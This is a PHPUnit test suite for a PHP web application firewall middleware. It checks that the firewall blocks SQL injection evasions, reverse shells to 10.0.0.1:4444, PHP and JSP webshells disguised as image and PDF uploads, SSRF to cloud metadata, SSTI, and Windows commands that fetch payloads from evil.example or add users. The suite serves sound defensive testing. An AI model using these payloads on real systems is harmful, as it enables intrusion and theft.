<?php

declare(strict_types=1);

namespace Prowendi\HyperfHttpWaf\Tests;

use Prowendi\HyperfHttpWaf\Tests\Stubs\OkHandler;
use Nyholm\Psr7\Stream;
use Nyholm\Psr7\UploadedFile;

/**
 * Round-3 red team suite: deeper SQLi evasions and additional attack surfaces.
 */
final class WafBypassRound3Test extends TestCase
{
    /**
     * @return iterable<string, list<string>>
     */
    public static function sqliProvider(): iterable
    {
        yield 'boolean keyword true' => ["' OR TRUE--"];
        yield 'like tautology' => ["' OR 'a' LIKE 'a'--"];
        yield 'not-equal tautology' => ["' AND 1<>2--"];
        yield 'less-than tautology' => ["' OR 'a'<'b'#"];
        yield 'having probe' => ["' HAVING 1=1--"];
        yield 'order by column probe' => ['1 ORDER BY 10--'];
        yield 'extractvalue error-based' => ['1 AND EXTRACTVALUE(1,CONCAT(0x7c,USER()))--'];
        yield 'updatexml error-based' => ['1 AND UPDATEXML(1,CONCAT(0x7e,USER()),1)--'];
        yield 'boolean blind substr ascii' => ['1 AND ASCII(SUBSTR(USER(),1,1))>97'];
        yield 'mysql version comment union' => ['/*!50000union*/ /*!50000select*/ USER()'];
        yield 'load_file payload' => ["LOAD_FILE('/var/www/index.php')"];
        yield 'information schema probe' => ['information_schema.tables'];
        yield 'case when blind' => ['1 AND CASE WHEN 1=1 THEN 1 ELSE 0 END'];
        yield 'if blind' => ['1 AND IF(1=1,1,0)'];
    }

    /**
     * @dataProvider sqliProvider
     */
    public function testDeepSqlInjectionVariantsAreBlocked(string $payload): void
    {
        $middleware = $this->createMiddleware([
            'mode' => 'block',
            'decision' => ['score_threshold' => 40],
        ]);

        $request = $this->createRequest('GET', '/search', ['user-agent' => 'Mozilla/5.0'])
            ->withQueryParams(['q' => $payload]);

        self::assertSame(403, $middleware->process($request, new OkHandler())->getStatusCode(), $payload);
    }

    /**
     * @return iterable<string, list<string>>
     */
    public static function reverseShellProvider(): iterable
    {
        yield 'bash dev tcp' => ['bash -i >& /dev/tcp/10.0.0.1/4444 0>&1'];
        yield 'nc exec shell' => ['nc -e /bin/sh 10.0.0.1 4444'];
        yield 'socat exec' => ['socat TCP:10.0.0.1:4444 EXEC:/bin/sh'];
        yield 'python socket reverse' => ["python3 -c 'import socket,subprocess,os'"];
    }

    /**
     * @dataProvider reverseShellProvider
     */
    public function testReverseShellPayloadsAreBlocked(string $payload): void
    {
        $middleware = $this->createMiddleware(['mode' => 'block']);

        $request = $this->createRequest('GET', '/run', ['user-agent' => 'Mozilla/5.0'])
            ->withQueryParams(['c' => $payload]);

        self::assertSame(403, $middleware->process($request, new OkHandler())->getStatusCode(), $payload);
    }

    /**
     * @return iterable<string, list<string>>
     */
    public static function codeExecProvider(): iterable
    {
        yield 'eval base64' => ['eval(base64_decode($_POST[z]))'];
        yield 'assert callback' => ['assert($_POST[c])'];
        yield 'preg replace e modifier' => ["preg_replace('/.*/e', 'eval(1)', $x)"];
        yield 'create function' => ["create_function('$a', 'return 1;')"];
        yield 'call user func assert' => ['call_user_func(assert, phpinfo)'];
        yield 'system passthru' => ['system($_GET[c]); passthru(id)'];
    }

    /**
     * @dataProvider codeExecProvider
     */
    public function testPhpCodeExecutionStringsAreBlocked(string $payload): void
    {
        $middleware = $this->createMiddleware([
            'mode' => 'block',
            'decision' => ['score_threshold' => 40],
        ]);

        $request = $this->createRequest('GET', '/plugin', ['user-agent' => 'Mozilla/5.0'])
            ->withQueryParams(['code' => $payload]);

        self::assertSame(403, $middleware->process($request, new OkHandler())->getStatusCode(), $payload);
    }

    public function testAliyunMetadataSsrfIsBlocked(): void
    {
        $middleware = $this->createMiddleware([
            'mode' => 'block',
            'decision' => ['score_threshold' => 40],
        ]);

        $request = $this->createRequest('GET', '/fetch', ['user-agent' => 'Mozilla/5.0'])
            ->withQueryParams(['url' => 'http://100.100.100.200/latest/meta-data/']);

        self::assertSame(403, $middleware->process($request, new OkHandler())->getStatusCode());
    }

    public function testGopherSchemeWithoutIpIsBlocked(): void
    {
        $middleware = $this->createMiddleware([
            'mode' => 'block',
            'decision' => ['score_threshold' => 40],
        ]);

        $request = $this->createRequest('GET', '/fetch', ['user-agent' => 'Mozilla/5.0'])
            ->withQueryParams(['url' => 'gopher://internal-redis:6379/_INFO']);

        self::assertSame(403, $middleware->process($request, new OkHandler())->getStatusCode());
    }

    /**
     * @return iterable<string, list<string>>
     */
    public static function credentialLeakProvider(): iterable
    {
        // Built by concatenation so secret scanners never see a complete
        // token literal; the WAF rule still matches the assembled string.
        yield 'aws access key' => ['AKIA' . 'IOSFODNN7EXAMPLE'];
        yield 'private key block' => ["-----BEGIN RSA PRIVATE KEY-----\nMIIEow...\n-----END RSA PRIVATE KEY-----"];
        yield 'stripe live key' => ['sk_live_' . '4eC39HqLyjWDarjtT1zdp7dc'];
        yield 'github token' => ['ghp_' . '16C7e42F292c6912E7710c838347Ae178B4a'];
    }

    /**
     * @dataProvider credentialLeakProvider
     */
    public function testCredentialLeakInParamsIsFlagged(string $payload): void
    {
        $middleware = $this->createMiddleware([
            'mode' => 'block',
            'decision' => ['score_threshold' => 40],
        ]);

        $request = $this->createRequest('POST', '/settings', [
            'content-type' => 'application/json',
            'user-agent' => 'Mozilla/5.0',
        ], '{"note":' . json_encode($payload) . '}');

        self::assertSame(403, $middleware->process($request, new OkHandler())->getStatusCode(), $payload);
    }

    public function testJwtAlgNoneTokenIsFlagged(): void
    {
        $middleware = $this->createMiddleware([
            'mode' => 'block',
            'decision' => ['score_threshold' => 40],
        ]);

        $request = $this->createRequest('GET', '/', ['user-agent' => 'Mozilla/5.0'])
            ->withQueryParams(['token' => 'eyJhbGciOiJub25lIn0.eyJhZG1pbiI6dHJ1ZX0.']);

        self::assertSame(403, $middleware->process($request, new OkHandler())->getStatusCode());
    }

    public function testSstiPayloadsAreBlocked(): void
    {
        $middleware = $this->createMiddleware([
            'mode' => 'block',
            'decision' => ['score_threshold' => 40],
        ]);

        $request = $this->createRequest('GET', '/render', ['user-agent' => 'Mozilla/5.0'])
            ->withQueryParams(['tpl' => '{{().__class__.__mro__[1].__subclasses__()}}']);

        self::assertSame(403, $middleware->process($request, new OkHandler())->getStatusCode());

        $request = $this->createRequest('GET', '/render', ['user-agent' => 'Mozilla/5.0'])
            ->withQueryParams(['tpl' => '<#assign ex="freemarker.template.utility.Execute">${ex("id")}']);

        self::assertSame(403, $middleware->process($request, new OkHandler())->getStatusCode());
    }

    /**
     * @return iterable<string, list<string>>
     */
    public static function sensitivePathProvider(): iterable
    {
        yield 'git head' => ['/.git/HEAD'];
        yield 'svn entries' => ['/.svn/entries'];
        yield 'ds store' => ['/.DS_Store'];
        yield 'htaccess' => ['/.htaccess'];
        yield 'server status' => ['/server-status'];
    }

    /**
     * @dataProvider sensitivePathProvider
     */
    public function testAdditionalSensitivePathsAreBlocked(string $path): void
    {
        $middleware = $this->createMiddleware(['mode' => 'block']);

        $request = $this->createRequest('GET', $path, ['user-agent' => 'Mozilla/5.0']);

        self::assertSame(403, $middleware->process($request, new OkHandler())->getStatusCode(), $path);
    }

    /**
     * @return iterable<string, list<string>>
     */
    public static function windowsCommandProvider(): iterable
    {
        yield 'mshta remote' => ['; mshta http://evil.example/x.hta'];
        yield 'bitsadmin download' => ['; bitsadmin /transfer j http://evil.example/x.exe C:\\x.exe'];
        yield 'net user add' => ['; net user hacker P@ss /add'];
        yield 'netsh firewall' => ['; netsh advfirewall firewall add rule name=x dir=in action=allow'];
    }

    /**
     * @dataProvider windowsCommandProvider
     */
    public function testWindowsCommandInjectionIsBlocked(string $payload): void
    {
        $middleware = $this->createMiddleware([
            'mode' => 'block',
            'decision' => ['score_threshold' => 40],
        ]);

        $request = $this->createRequest('GET', '/ping', ['user-agent' => 'Mozilla/5.0'])
            ->withQueryParams(['host' => $payload]);

        self::assertSame(403, $middleware->process($request, new OkHandler())->getStatusCode(), $payload);
    }

    public function testPhpWebshellContentInCleanExtensionUploadIsBlocked(): void
    {
        $middleware = $this->createMiddleware(['mode' => 'block']);

        $request = $this->createRequest('POST', '/avatar', [
            'user-agent' => 'Mozilla/5.0',
        ])->withUploadedFiles([
            'avatar' => new UploadedFile(
                Stream::create("<?php eval(\$_POST['cmd']); ?>\x00\x00"),
                1024,
                UPLOAD_ERR_OK,
                'profile.jpg',
                'image/jpeg'
            ),
        ]);

        self::assertSame(403, $middleware->process($request, new OkHandler())->getStatusCode());
    }

    public function testJspWebshellContentIsBlocked(): void
    {
        $middleware = $this->createMiddleware(['mode' => 'block']);

        $request = $this->createRequest('POST', '/doc', [
            'user-agent' => 'Mozilla/5.0',
        ])->withUploadedFiles([
            'doc' => new UploadedFile(
                Stream::create('<%@ page import="java.util.*" %><%Runtime.getRuntime().exec(request.getParameter("c"));%>'),
                512,
                UPLOAD_ERR_OK,
                'notes.pdf',
                'application/pdf'
            ),
        ]);

        self::assertSame(403, $middleware->process($request, new OkHandler())->getStatusCode());
    }
}
